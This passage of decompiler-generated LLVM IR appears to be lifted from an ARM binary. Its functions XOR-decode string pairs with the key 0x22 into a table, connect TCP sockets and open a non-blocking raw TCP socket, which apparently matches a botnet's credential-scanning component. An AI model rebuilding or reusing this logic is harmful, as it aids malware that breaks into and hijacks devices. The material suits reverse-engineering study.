  %v0_100f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_100f4, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_100e4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_100e4, %bb
  ret i32 %v2_100f0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_100f8() local_unnamed_addr {
dec_label_pc_100f8:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_100f8 = load i32, i32* @r4, align 4
  store i32 %v3_100f8, i32* %stack_var_-16, align 4
  %v0_100fc = load i32, i32* @r0, align 4
  store i32 %v0_100fc, i32* %r5.global-to-local, align 4
  %v1_10100 = add i32 %v0_100fc, 4
  %v2_10100 = inttoptr i32 %v1_10100 to i32*
  %v3_10100 = load i32, i32* %v2_10100, align 4
  store i32 %v3_10100, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 65828, i32* @lr, align 4
  %v1_10120 = icmp ne i32 %v3_10100, -1
  call void @__pseudo_cond_branch(i1 %v1_10120, i32 ptrtoint (i32* @global_var_12e9c.25 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_10130 = call i32 @function_13790(i32 2, i32 1, i32 0)
  store i32 %v3_10130, i32* %r3.global-to-local, align 4
  %v7_10138 = icmp eq i32 %v3_10130, -1
  %v0_10140 = load i32, i32* %r5.global-to-local, align 4
  %v1_10140 = add i32 %v0_10140, 28
  store i32 %v1_10140, i32* %r0.global-to-local, align 4
  %v2_10144 = add i32 %v0_10140, 4
  %v3_10144 = inttoptr i32 %v2_10144 to i32*
  store i32 %v3_10130, i32* %v3_10144, align 4
  br i1 %v7_10138, label %dec_label_pc_100f8.dec_label_pc_101c0_crit_edge, label %dec_label_pc_1014c

dec_label_pc_100f8.dec_label_pc_101c0_crit_edge:  ; preds = %dec_label_pc_100f8
  %v14_101c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_101c0

dec_label_pc_1014c:                               ; preds = %dec_label_pc_100f8
  %v0_1014c = load i32, i32* %r6.global-to-local, align 4
  %v1_1014c = load i32, i32* %r5.global-to-local, align 4
  %v2_1014c = add i32 %v1_1014c, 24
  %v3_1014c = inttoptr i32 %v2_1014c to i32*
  store i32 %v0_1014c, i32* %v3_1014c, align 4
  %v0_10150 = load i32, i32* %r0.global-to-local, align 4
  %v2_10150 = call i32 @function_1257c(i32 %v0_10150, i32 256)
  store i32 %v2_10150, i32* %r0.global-to-local, align 4
  %v0_10154 = load i32, i32* %r5.global-to-local, align 4
  %v1_10154 = add i32 %v0_10154, 4
  %v2_10154 = inttoptr i32 %v1_10154 to i32*
  %v3_10154 = load i32, i32* %v2_10154, align 4
  store i32 %v3_10154, i32* @r4, align 4
  %v0_1015c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1015c, i32* @r2, align 4
  store i32 %v3_10154, i32* %r0.global-to-local, align 4
  %v2_10164 = call i32 @function_12dac(i32 %v3_10154, i32 3)
  %v1_1016c = or i32 %v2_10164, 2048
  store i32 %v1_1016c, i32* @r2, align 4
  %v0_10170 = load i32, i32* @r4, align 4
  store i32 %v0_10170, i32* %r0.global-to-local, align 4
  %v2_10174 = call i32 @function_12dac(i32 %v0_10170, i32 4)
  store i32 %v2_10174, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e424.184 to i32), i32* %r3.global-to-local, align 4
  %v0_1017c = load i32, i32* %r5.global-to-local, align 4
  %v1_1017c = add i32 %v0_1017c, 20
  %v2_1017c = inttoptr i32 %v1_1017c to i32*
  %v3_1017c = load i32, i32* %v2_1017c, align 4
  store i32 %v3_1017c, i32* @r4, align 4
  %v2_10180 = load i32, i32* @global_var_1e424.184, align 4
  %v1_10184 = add i32 %v0_1017c, 16
  %v2_10184 = inttoptr i32 %v1_10184 to i32*
  %v3_10184 = load i32, i32* %v2_10184, align 4
  store i32 %v3_10184, i32* @lr, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_1018c = add i32 %v0_1017c, 8
  %v3_1018c = inttoptr i32 %v2_1018c to i32*
  store i32 %v2_10180, i32* %v3_1018c, align 4
  %v0_10190 = load i32, i32* %r3.global-to-local, align 4
  %v1_10190 = load i32, i32* %r5.global-to-local, align 4
  %v2_10190 = add i32 %v1_10190, 12
  %v3_10190 = inttoptr i32 %v2_10190 to i32*
  store i32 %v0_10190, i32* %v3_10190, align 4
  %v0_10198 = load i32, i32* %r5.global-to-local, align 4
  %v1_10198 = add i32 %v0_10198, 4
  %v2_10198 = inttoptr i32 %v1_10198 to i32*
  %v3_10198 = load i32, i32* %v2_10198, align 4
  store i32 %v3_10198, i32* %r0.global-to-local, align 4
  %v0_1019c = load i32, i32* %r3.global-to-local, align 4
  %v2_1019c = mul i32 %v0_1019c, 2
  store i32 %v2_1019c, i32* %r3.global-to-local, align 4
  store i32 %v2_1019c, i32* %stack_var_-32, align 4
  %v3_101bc = bitcast i32* %stack_var_-32 to %sockaddr*
  %v4_101bc = call i32 @function_135ec(i32 %v3_10198, %sockaddr* %v3_101bc, i32 16)
  store i32 %v4_101bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_101c0

dec_label_pc_101c0:                               ; preds = %dec_label_pc_100f8.dec_label_pc_101c0_crit_edge, %dec_label_pc_1014c
  %v14_101c4 = phi i32 [ %v14_101c4.pre, %dec_label_pc_100f8.dec_label_pc_101c0_crit_edge ], [ %v4_101bc, %dec_label_pc_1014c ]
  %v2_101c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_101c4, i32* @r4, align 4
  ret i32 %v14_101c4

; uselistorder directives
  uselistorder i32 %v2_1019c, { 1, 0 }
  uselistorder i32 %v3_10130, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 8, 6, 5, 7, 9, 10 }
  uselistorder i32 (i32, i32)* @function_1257c, { 7, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_101c0, { 1, 0 }
}

define i32 @function_101cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_101cc:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_101cc = load i32, i32* @r4, align 4
  %v6_101cc = load i32, i32* @r5, align 4
  %v9_101cc = load i32, i32* @r6, align 4
  %v12_101cc = load i32, i32* @r7, align 4
  %v15_101cc = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1e3f0.186 to i32), i32* @r8, align 4
  %v2_101d4 = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 ptrtoint (i32* @global_var_1e41c.188 to i32), i32* %sb.global-to-local, align 4
  %v3_101e0 = mul i32 %v2_101d4, 16
  store i32 %v3_101e0, i32* %r3.global-to-local, align 4
  %v3_101e8 = urem i32 %arg3, 65536
  store i32 %v3_101e8, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_101f4 = load i32, i32* @global_var_1e41c.188, align 4
  %v1_101f8 = add i32 %v3_101e0, 16
  store i32 %v1_101f8, i32* %r1.global-to-local, align 4
  store i32 %v3_101e8, i32* %stack_var_-44, align 4
  %v15_10200 = call i32 @function_13bdc(i32 %v2_101f4, i32 %v1_101f8, i32 %v3_101e8, i32 %v3_101e0)
  store i32 %v15_10200, i32* %sl.global-to-local, align 4
  %v0_10208 = load i32, i32* @r5, align 4
  %v1_1020c = load i32, i32* %sb.global-to-local, align 4
  %v2_1020c = inttoptr i32 %v1_1020c to i32*
  store i32 %v15_10200, i32* %v2_1020c, align 4
  %v2_10210 = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 %v2_10210, i32* %fp.global-to-local, align 4
  %v1_10214 = inttoptr i32 %v0_10208 to i8*
  %v2_10214 = call i32 @function_124dc(i8* %v1_10214)
  %sext = mul i32 %v2_10214, 16777216
  %v1_10218 = sdiv i32 %sext, 16777216
  %v2_10218 = add nsw i32 %v1_10218, 1
  store i32 %v2_10218, i32* @r4, align 4
  store i32 %v1_10218, i32* @r7, align 4
  %v1_10224 = call i32 @function_13940(i32 %v2_10218)
  %v0_10228 = load i32, i32* @r5, align 4
  store i32 %v0_10228, i32* %r1.global-to-local, align 4
  %v0_1022c = load i32, i32* @r4, align 4
  store i32 %v0_1022c, i32* %r2.global-to-local, align 4
  store i32 %v1_10224, i32* @r6, align 4
  %v3_10234 = call i32 @function_12558(i32 %v1_10224, i32 %v0_10228, i32 %v0_1022c)
  %v0_10238 = load i32, i32* @r7, align 4
  %tmp21 = icmp slt i32 %v0_10238, 1
  %extract.t6 = trunc i32 %v0_10238 to i8
  br i1 %tmp21, label %dec_label_pc_1025c, label %dec_label_pc_10240

dec_label_pc_10240:                               ; preds = %dec_label_pc_101cc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10244

dec_label_pc_10244:                               ; preds = %dec_label_pc_10244, %dec_label_pc_10240
  %v2_1024c = phi i32 [ %v1_10250, %dec_label_pc_10244 ], [ 0, %dec_label_pc_10240 ]
  %v1_10244 = load i32, i32* @r6, align 4
  %v2_10244 = add i32 %v1_10244, %v2_1024c
  %v3_10244 = inttoptr i32 %v2_10244 to i8*
  %v4_10244 = load i8, i8* %v3_10244, align 1
  %v6_10244 = zext i8 %v4_10244 to i32
  %v1_10248 = xor i32 %v6_10244, 34
  store i32 %v1_10248, i32* %r3.global-to-local, align 4
  %v1_1024c = trunc i32 %v1_10248 to i8
  store i8 %v1_1024c, i8* %v3_10244, align 1
  %v0_10250 = load i32, i32* %r2.global-to-local, align 4
  %v1_10250 = add i32 %v0_10250, 1
  store i32 %v1_10250, i32* %r2.global-to-local, align 4
  %v0_10254 = load i32, i32* @r7, align 4
  %v9_10254 = icmp eq i32 %v0_10254, %v1_10250
  br i1 %v9_10254, label %dec_label_pc_1025c.loopexit, label %dec_label_pc_10244

dec_label_pc_1025c.loopexit:                      ; preds = %dec_label_pc_10244
  %extract.t = trunc i32 %v1_10250 to i8
  br label %dec_label_pc_1025c

dec_label_pc_1025c:                               ; preds = %dec_label_pc_1025c.loopexit, %dec_label_pc_101cc
  %v0_1026c.off0 = phi i8 [ %extract.t, %dec_label_pc_1025c.loopexit ], [ %extract.t6, %dec_label_pc_101cc ]
  %v2_1025c = load i32, i32* @global_var_1e3f0.186, align 4
  %v2_10260 = load i32, i32* @global_var_1e41c.188, align 4
  store i32 %v2_10260, i32* %r2.global-to-local, align 4
  %v3_10264 = mul i32 %v2_1025c, 16
  %v2_10268 = add i32 %v2_10260, %v3_10264
  store i32 %v2_10268, i32* %r3.global-to-local, align 4
  %v3_1026c = add i32 %v2_10268, 12
  %v4_1026c = inttoptr i32 %v3_1026c to i8*
  store i8 %v0_1026c.off0, i8* %v4_1026c, align 1
  %v0_10270 = load i32, i32* @r6, align 4
  %v1_10270 = load i32, i32* %sl.global-to-local, align 4
  %v2_10270 = load i32, i32* %fp.global-to-local, align 4
  %v5_10270 = mul i32 %v2_10270, 16
  %v6_10270 = add i32 %v5_10270, %v1_10270
  %v7_10270 = inttoptr i32 %v6_10270 to i32*
  store i32 %v0_10270, i32* %v7_10270, align 4
  %v2_10278 = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 %v2_10278, i32* @r7, align 4
  %v2_1027c = load i32, i32* @global_var_1e41c.188, align 4
  store i32 %v2_1027c, i32* %sl.global-to-local, align 4
  %v1_10280 = inttoptr i32 %arg2 to i8*
  %v2_10280 = call i32 @function_124dc(i8* %v1_10280)
  %sext1 = mul i32 %v2_10280, 16777216
  %v1_10284 = sdiv i32 %sext1, 16777216
  %v2_10284 = add nsw i32 %v1_10284, 1
  store i32 %v2_10284, i32* @r4, align 4
  store i32 %v1_10284, i32* @r5, align 4
  %v1_10290 = call i32 @function_13940(i32 %v2_10284)
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_10298 = load i32, i32* @r4, align 4
  store i32 %v0_10298, i32* %r2.global-to-local, align 4
  store i32 %v1_10290, i32* %r6.global-to-local, align 4
  %v3_102a0 = call i32 @function_12558(i32 %v1_10290, i32 %arg2, i32 %v0_10298)
  %v0_102a4 = load i32, i32* @r5, align 4
  %tmp22 = icmp slt i32 %v0_102a4, 1
  %extract.t8 = trunc i32 %v0_102a4 to i8
  br i1 %tmp22, label %dec_label_pc_102c8, label %dec_label_pc_102ac

dec_label_pc_102ac:                               ; preds = %dec_label_pc_1025c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102b0

dec_label_pc_102b0:                               ; preds = %dec_label_pc_102b0, %dec_label_pc_102ac
  %v2_102b8 = phi i32 [ %v1_102bc, %dec_label_pc_102b0 ], [ 0, %dec_label_pc_102ac ]
  %v1_102b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_102b0 = add i32 %v1_102b0, %v2_102b8
  %v3_102b0 = inttoptr i32 %v2_102b0 to i8*
  %v4_102b0 = load i8, i8* %v3_102b0, align 1
  %v6_102b0 = zext i8 %v4_102b0 to i32
  %v1_102b4 = xor i32 %v6_102b0, 34
  store i32 %v1_102b4, i32* %r3.global-to-local, align 4
  %v1_102b8 = trunc i32 %v1_102b4 to i8
  store i8 %v1_102b8, i8* %v3_102b0, align 1
  %v0_102bc = load i32, i32* %r2.global-to-local, align 4
  %v1_102bc = add i32 %v0_102bc, 1
  store i32 %v1_102bc, i32* %r2.global-to-local, align 4
  %v0_102c0 = load i32, i32* @r5, align 4
  %v9_102c0 = icmp eq i32 %v0_102c0, %v1_102bc
  br i1 %v9_102c0, label %dec_label_pc_102c8.loopexit, label %dec_label_pc_102b0

dec_label_pc_102c8.loopexit:                      ; preds = %dec_label_pc_102b0
  %extract.t7 = trunc i32 %v1_102bc to i8
  br label %dec_label_pc_102c8

dec_label_pc_102c8:                               ; preds = %dec_label_pc_102c8.loopexit, %dec_label_pc_1025c
  %v0_102d8.off0 = phi i8 [ %extract.t7, %dec_label_pc_102c8.loopexit ], [ %extract.t8, %dec_label_pc_1025c ]
  %v2_102c8 = load i32, i32* @global_var_1e3f0.186, align 4
  %v2_102cc = load i32, i32* @global_var_1e41c.188, align 4
  %v3_102d0 = mul i32 %v2_102c8, 16
  %v2_102d4 = or i32 %v3_102d0, 13
  %v3_102d8 = add i32 %v2_102d4, %v2_102cc
  %v4_102d8 = inttoptr i32 %v3_102d8 to i8*
  store i8 %v0_102d8.off0, i8* %v4_102d8, align 1
  %v2_102e0 = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 %v2_102e0, i32* %lr.global-to-local, align 4
  %v4_102e4 = load i8, i8* @global_var_1e421.191, align 1
  %v5_102e4 = zext i8 %v4_102e4 to i32
  %v3_102e8 = load i8, i8* bitcast (i8** @global_var_1e420.190 to i8*), align 4
  %v4_102e8 = zext i8 %v3_102e8 to i32
  %v2_102ec = load i32, i32* @global_var_1e41c.188, align 4
  %v4_102f0 = mul nuw nsw i32 %v5_102e4, 256
  %v5_102f0 = or i32 %v4_102e8, %v4_102f0
  store i32 %v5_102f0, i32* %r2.global-to-local, align 4
  %v3_102f4 = mul i32 %v2_102e0, 16
  %v2_102f8 = add i32 %v2_102ec, %v3_102f4
  store i32 %v2_102f8, i32* %r1.global-to-local, align 4
  %v3_10300 = add i32 %v2_102f8, 9
  %v4_10300 = inttoptr i32 %v3_10300 to i8*
  store i8 %v4_102e4, i8* %v4_10300, align 1
  %v0_10304 = load i32, i32* %r2.global-to-local, align 4
  %v1_10304 = trunc i32 %v0_10304 to i8
  %v2_10304 = load i32, i32* %r1.global-to-local, align 4
  %v3_10304 = add i32 %v2_10304, 8
  %v4_10304 = inttoptr i32 %v3_10304 to i8*
  store i8 %v1_10304, i8* %v4_10304, align 1
  %v4_10308 = load i8, i8* @global_var_1e421.191, align 1
  %v5_10308 = zext i8 %v4_10308 to i32
  %v3_1030c = load i8, i8* bitcast (i8** @global_var_1e420.190 to i8*), align 4
  %v4_1030c = zext i8 %v3_1030c to i32
  %v4_10310 = mul nuw nsw i32 %v5_10308, 256
  %v5_10310 = or i32 %v4_1030c, %v4_10310
  %v2_10314 = load i32, i32* %stack_var_-44, align 4
  %v2_10318 = add i32 %v5_10310, %v2_10314
  store i32 %v2_10318, i32* %r3.global-to-local, align 4
  %v3_1031c9 = udiv i32 %v2_10318, 256
  %v1_10320 = trunc i32 %v3_1031c9 to i8
  %v2_10320 = load i32, i32* %r1.global-to-local, align 4
  %v3_10320 = add i32 %v2_10320, 11
  %v4_10320 = inttoptr i32 %v3_10320 to i8*
  store i8 %v1_10320, i8* %v4_10320, align 1
  %v0_10324 = load i32, i32* %r3.global-to-local, align 4
  %v1_10324 = trunc i32 %v0_10324 to i8
  %v2_10324 = load i32, i32* %r1.global-to-local, align 4
  %v3_10324 = add i32 %v2_10324, 10
  %v4_10324 = inttoptr i32 %v3_10324 to i8*
  store i8 %v1_10324, i8* %v4_10324, align 1
  %v4_10328 = load i8, i8* @global_var_1e421.191, align 1
  %v5_10328 = zext i8 %v4_10328 to i32
  %v3_1032c = load i8, i8* bitcast (i8** @global_var_1e420.190 to i8*), align 4
  %v4_1032c = zext i8 %v3_1032c to i32
  %v4_10330 = mul nuw nsw i32 %v5_10328, 256
  %v5_10330 = or i32 %v4_1032c, %v4_10330
  %v2_10334 = load i32, i32* %stack_var_-44, align 4
  %v2_10338 = add i32 %v5_10330, %v2_10334
  store i32 %v2_10338, i32* %r2.global-to-local, align 4
  %v0_1033c = load i32, i32* @r7, align 4
  %v3_1033c = mul i32 %v0_1033c, 16
  %v1_10340 = load i32, i32* %sl.global-to-local, align 4
  %v2_10340 = add i32 %v1_10340, %v3_1033c
  store i32 %v2_10340, i32* %r3.global-to-local, align 4
  %v0_10344 = load i32, i32* %lr.global-to-local, align 4
  %v1_10344 = add i32 %v0_10344, 1
  store i32 %v1_10344, i32* @lr, align 4
  %v3_10348 = sdiv i32 %v2_10338, 256
  store i32 %v3_10348, i32* %r1.global-to-local, align 4
  %v0_1034c = load i32, i32* %r6.global-to-local, align 4
  %v2_1034c = add i32 %v2_10340, 4
  %v3_1034c = inttoptr i32 %v2_1034c to i32*
  store i32 %v0_1034c, i32* %v3_1034c, align 4
  %v0_10350 = load i32, i32* @lr, align 4
  %v1_10350 = load i32, i32* @r8, align 4
  %v2_10350 = inttoptr i32 %v1_10350 to i32*
  store i32 %v0_10350, i32* %v2_10350, align 4
  %v0_10354 = load i32, i32* %r1.global-to-local, align 4
  %v1_10354 = trunc i32 %v0_10354 to i8
  store i8 %v1_10354, i8* @global_var_1e421.191, align 1
  %v0_10358 = load i32, i32* %r2.global-to-local, align 4
  %v1_10358 = trunc i32 %v0_10358 to i8
  store i8 %v1_10358, i8* bitcast (i8** @global_var_1e420.190 to i8*), align 4
  store i32 %v3_101cc, i32* @r4, align 4
  store i32 %v6_101cc, i32* @r5, align 4
  store i32 %v9_101cc, i32* @r6, align 4
  store i32 %v12_101cc, i32* @r7, align 4
  store i32 %v15_101cc, i32* @r8, align 4
  ret i32 ptrtoint (i8** @global_var_1e420.190 to i32)

; uselistorder directives
  uselistorder i32 %v1_102bc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10290, { 1, 0 }
  uselistorder i32 %v1_10250, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10224, { 1, 0 }
  uselistorder i32 %v3_101e8, { 1, 2, 0 }
  uselistorder i32 %v3_101e0, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e420.190 to i8*), { 0, 3, 2, 1 }
  uselistorder i8* @global_var_1e421.191, { 3, 2, 1, 0 }
  uselistorder i32 (i8*)* @function_124dc, { 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 79, 80, 81, 42, 43, 44, 45, 46, 47, 48, 49, 71, 72, 73, 74, 75, 76, 77, 78, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder i32 (i32, i32, i32, i32)* @function_13bdc, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_10370() local_unnamed_addr {
dec_label_pc_10370:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp218 = call i32 @__decompiler_undefined_function_0()
  %tmp219 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %tmp247 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-36 = alloca i32, align 4
  %v3_10370 = load i32, i32* @r4, align 4
  store i32 %v3_10370, i32* %stack_var_-36, align 4
  %v6_10370 = load i32, i32* @r5, align 4
  %v9_10370 = load i32, i32* @r6, align 4
  %v12_10370 = load i32, i32* @r7, align 4
  %v15_10370 = load i32, i32* @r8, align 4
  %v18_10370 = load i32, i32* @sb, align 4
  %v21_10370 = load i32, i32* @sl, align 4
  %v24_10370 = load i32, i32* @fp, align 4
  %v0_1037c = call i32 @function_12ec8()
  store i32 %v0_1037c, i32* %r0.global-to-local, align 4
  %v7_10380 = icmp eq i32 %v0_1037c, -1
  %. = zext i1 %v7_10380 to i32
  %tmp250 = icmp slt i32 %v0_1037c, 1
  %storemerge210 = select i1 %tmp250, i32 %., i32 1
  store i32 %storemerge210, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1e890.182 to i32), i32* %r3.global-to-local, align 4
  %v2_1039c = icmp eq i32 %storemerge210, 0
  store i1 %v2_1039c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1037c, i32* @global_var_1e890.182, align 4
  br i1 %v2_1039c, label %dec_label_pc_103b4, label %dec_label_pc_103a8

dec_label_pc_103a8:                               ; preds = %dec_label_pc_10370
  store i32 %v3_10370, i32* @r4, align 4
  store i32 %v6_10370, i32* %r5.global-to-local, align 4
  store i32 %v9_10370, i32* @r6, align 4
  store i32 %v12_10370, i32* @r7, align 4
  store i32 %v15_10370, i32* @r8, align 4
  store i32 %v18_10370, i32* @sb, align 4
  store i32 %v21_10370, i32* @sl, align 4
  store i32 %v24_10370, i32* @fp, align 4
  ret i32 %v0_1037c

dec_label_pc_103b4:                               ; preds = %dec_label_pc_10370
  %v0_103b4 = call i32 @function_12794()
  store i32 %v0_103b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e46c.86 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_103b4, i32* @global_var_1e46c.86, align 4
  %v1_103c0 = call i32 @function_fe7c(i32 %v0_103b4)
  %v0_103c4 = load i32, i32* @r4, align 4
  store i32 %v0_103c4, i32* %r0.global-to-local, align 4
  %v1_103c8 = inttoptr i32 %v0_103c4 to i32*
  %v2_103c8 = call i32 @function_1316c(i32* %v1_103c8)
  store i32 ptrtoint (i32* @global_var_1e424.184 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_103c8, i32* @global_var_1e424.184, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_103dc = call i32 @function_13a94(i32 256, i32 288)
  store i32 %v2_103dc, i32* @lr, align 4
  %v0_103e8 = load i32, i32* @r4, align 4
  store i32 %v0_103e8, i32* %stack_var_-52, align 4
  store i32 %v2_103dc, i32* @global_var_1e488.196, align 4
  store i32 %v0_103e8, i32* %r3.global-to-local, align 4
  store i32 %v0_103e8, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_103e8, i32* %ip.global-to-local, align 4
  %v1_10400 = add i32 %v2_103dc, 4
  store i32 %v1_10400, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10404

dec_label_pc_10404:                               ; preds = %dec_label_pc_10404.dec_label_pc_10404_crit_edge, %dec_label_pc_103b4
  %v0_10414 = phi i32 [ %v0_10414.pre, %dec_label_pc_10404.dec_label_pc_10404_crit_edge ], [ %v0_103e8, %dec_label_pc_103b4 ]
  %v2_10414 = phi i32 [ %v0_1042c, %dec_label_pc_10404.dec_label_pc_10404_crit_edge ], [ %v0_103e8, %dec_label_pc_103b4 ]
  %v2_1040c = mul i32 %v2_10414, 288
  store i32 %v2_1040c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* %r2.global-to-local, align 4
  %v5_10414 = mul i32 %v2_10414, 4
  %v6_10414 = add i32 %v5_10414, ptrtoint (i8* @global_var_1e48c.198 to i32)
  %v7_10414 = inttoptr i32 %v6_10414 to i32*
  store i32 %v0_10414, i32* %v7_10414, align 4
  %v0_10418 = load i32, i32* %ip.global-to-local, align 4
  %v1_10418 = add i32 %v0_10418, 1
  store i32 %v1_10418, i32* %ip.global-to-local, align 4
  %v0_1041c = load i32, i32* %r3.global-to-local, align 4
  %v1_1041c = load i32, i32* @lr, align 4
  %v0_10424 = load i32, i32* %r5.global-to-local, align 4
  %v2_1041c = add i32 %v0_1041c, 12
  %v2_10424 = add i32 %v2_1041c, %v1_1041c
  %v3_10424 = inttoptr i32 %v2_10424 to i32*
  store i32 %v0_10424, i32* %v3_10424, align 4
  %v0_10428 = load i32, i32* %r0.global-to-local, align 4
  %v1_10428 = load i32, i32* %r1.global-to-local, align 4
  %v2_10428 = inttoptr i32 %v1_10428 to i32*
  store i32 %v0_10428, i32* %v2_10428, align 4
  %v3_10428 = load i32, i32* %r1.global-to-local, align 4
  %v4_10428 = add i32 %v3_10428, 288
  store i32 %v4_10428, i32* %r1.global-to-local, align 4
  %v0_1042c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1042c, i32* %r3.global-to-local, align 4
  %v7_10430 = icmp sgt i32 %v1_10418, 255
  br i1 %v7_10430, label %dec_label_pc_10434, label %dec_label_pc_10404.dec_label_pc_10404_crit_edge

dec_label_pc_10404.dec_label_pc_10404_crit_edge:  ; preds = %dec_label_pc_10404
  %v0_10414.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10404

dec_label_pc_10434:                               ; preds = %dec_label_pc_10404
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_1042c, i32* %stack_var_-52, align 4
  %v3_10444 = call i32 @function_13790(i32 2, i32 3, i32 6)
  store i32 %v3_10444, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e88c.200 to i32), i32* %r3.global-to-local, align 4
  %v7_1044c = icmp eq i32 %v3_10444, -1
  store i1 %v7_1044c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_10444, i32* @r4, align 4
  store i32 %v3_10444, i32* @global_var_1e88c.200, align 4
  br i1 %v7_1044c, label %dec_label_pc_10c98, label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_10434
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_10460 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10460, i32* @r2, align 4
  %v2_10464 = call i32 @function_12dac(i32 %v3_10444, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_1046c = or i32 %v2_10464, 2048
  store i32 %v1_1046c, i32* @r2, align 4
  %v0_10470 = load i32, i32* @r4, align 4
  store i32 %v0_10470, i32* %r0.global-to-local, align 4
  %v2_10474 = call i32 @function_12dac(i32 %v0_10470, i32 4)
  %v2_10480 = load i32, i32* @global_var_1e88c.200, align 4
  store i32 %v2_10480, i32* %r0.global-to-local, align 4
  %v0_10484 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10484, i32* %r1.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
